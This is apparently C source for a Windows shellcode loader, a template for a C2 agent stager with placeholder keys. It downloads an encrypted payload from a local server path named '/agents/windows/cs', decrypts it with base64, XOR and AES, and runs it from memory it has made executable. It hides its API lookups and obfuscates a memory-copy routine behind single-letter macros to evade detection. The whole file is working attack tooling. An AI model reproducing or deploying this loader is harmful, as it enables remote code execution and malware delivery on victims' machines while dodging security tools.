#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include <bcrypt.h>
#include <Wincrypt.h>

#include "aes.h"
#include "Structs.h"
#include "GetterFunctions.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

//#include "Structs.h"

#define l char
#define m *
#define n void
#define o while
#define p return
#define q --
#define r ++
#define s =
#define t size_t
n* memMirror(n* aA, const n* bB, t cC) { l m x s(l m)aA, m y s(l m)bB; o(cC q)* x r s* y r; p aA; }

BOOL Base64Decode(PCHAR base64, DWORD base64Size, PBYTE* pDecoded, DWORD* pDecodedSize) {
    if (!CryptStringToBinaryA(base64, base64Size, CRYPT_STRING_BASE64, NULL, pDecodedSize, NULL, NULL)) {
        printf("First base64 decode: Error %u in CryptStringToBinaryA.", GetLastError());
        return FALSE;
    }

    *pDecoded = (PBYTE)malloc(*pDecodedSize);
    if (*pDecoded == NULL) {
        printf("Memory allocation failed.");
        return FALSE;
    }

    if (!CryptStringToBinaryA(base64, base64Size, CRYPT_STRING_BASE64, *pDecoded, pDecodedSize, NULL, NULL)) {
        printf("Second base64 decode: Error %u in CryptStringToBinaryA.", GetLastError());
        free(*pDecoded);
        return FALSE;
    }

    return TRUE;
}

void XOR(PBYTE data, DWORD dataSize, PBYTE key, DWORD keySize) {
    for (DWORD i = 0; i < dataSize; ++i) {
        data[i] ^= key[i % keySize];
    }
}

typedef HINTERNET(WINAPI* INTERNETOPEN)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* INTERNETOPENURL)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* LPInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* LPInternetCloseHandle)(HINTERNET);

int main() {
    // Get a handle to the DLL module
    HMODULE hDll = GetModuleHandleReplacement(TEXT("wininet.dll"));
    unsigned char buffer[4096];
    DWORD bytesRead;
    DWORD totalBytesRead = 0;

    // If the handle is valid, try to get the function address
    if (hDll != NULL) {
        INTERNETOPEN pInternetOpen = (INTERNETOPEN)GetProcAddressReplacement(hDll, "InternetOpenW");
        INTERNETOPENURL pInternetOpenUrl = (INTERNETOPENURL)GetProcAddressReplacement(hDll, "InternetOpenUrlW");
        LPInternetReadFile pInternetReadFile = (LPInternetReadFile)GetProcAddressReplacement(hDll, "InternetReadFile");
        LPInternetCloseHandle pInternetCloseHandle = (LPInternetCloseHandle)GetProcAddressReplacement(hDll, "InternetCloseHandle");

        if (pInternetOpen != NULL && pInternetOpenUrl != NULL && pInternetReadFile != NULL && pInternetCloseHandle != NULL) {
            HINTERNET hInternet = pInternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (hInternet != NULL) {
                HINTERNET hConnect = pInternetOpenUrl(hInternet, L"http://localhost:8081/agents/windows/cs", NULL, 0, INTERNET_FLAG_RELOAD, 0);
                if (hConnect != NULL) {
                    while (pInternetReadFile(hConnect, buffer + totalBytesRead, sizeof(buffer) - totalBytesRead, &bytesRead) && bytesRead > 0) {
                        totalBytesRead += bytesRead;
                    }
                    // Close the connection handle
                    InternetCloseHandle(hConnect);
                }
                // Close the hInternet handle
                InternetCloseHandle(hInternet);
            }
        }
    }

    // Now you can use `char_enc_shellcode` as a char array.
    unsigned char* shellcode = NULL;
    DWORD* shellcode_size = 0;

    DWORD cbData = 0;
    DWORD decryptedSize = 0;
    unsigned char xorKey[] = "#1";
    DWORD xorKeySize = strlen(xorKey);
    unsigned char aesKey[] = "#2";
    DWORD aesKeySize = strlen(aesKey);
    unsigned char aesIV[] = "#3";
    DWORD aesIVSize = strlen(aesIV);

    PBYTE encryptedPayload;
    DWORD encryptedSize;

    Base64Decode(buffer, totalBytesRead, &encryptedPayload, &encryptedSize);

    XOR(encryptedPayload, encryptedSize, xorKey, xorKeySize);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aesKey, aesIV);
    AES_CBC_decrypt_buffer(&ctx, encryptedPayload, encryptedSize);

    shellcode = encryptedPayload;
    shellcode_size = encryptedSize;

    void* execMem = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_READWRITE);
    if (execMem != NULL) {
        memMirror(execMem, shellcode, shellcode_size);
        DWORD oldProtect;
        if (VirtualProtect(execMem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect)) {
            void (*func)() = (void(*)())execMem;
            func();
        }
        else {
            printf("Error in VirtualProtect: %u\n", GetLastError());
        }
        VirtualFree(execMem, 0, MEM_RELEASE);
    }
    else {
        printf("Error in VirtualAlloc: %u\n", GetLastError());
    }

    free(buffer);
    free(shellcode);
    return 0;
}
